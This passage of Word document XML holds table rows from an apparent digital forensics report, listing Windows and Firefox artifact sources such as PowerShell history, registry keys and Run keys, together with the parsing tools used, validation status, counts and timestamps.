          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SIDR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:30:35</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd, complementary batch)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:53:38.271884</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:23.987890</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: UserAssist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:12.358454</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:21.268000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>UserAssist (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:08:12.358454</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:30:33.504000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>COM objects (HKCU CLSID, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:54.056808</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:58.009935</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RecentDocs (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:50:32.262308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:35:02.285301</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: BAM/DAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:09:52.545138</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:31:08.706447</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>BAM (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:09:52.545137</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:58:10.416000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Firefox browser (visits)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:25:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:38:51</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: App Paths</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:53:43.397292</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:30:37.800196</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Installed applications</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>21</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-03-19 04:55:44.453800</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:25:49.409302</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Scheduled tasks (XML)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2005-06-23 21:48:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2016-01-01 00:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Firefox browser (bookmarks)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SQLECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:25:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:25:58</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: DeviceClasses</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 18:58:09.491228</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:49.017736</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: accounts (SAM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:02:46.526328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:23.548039</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
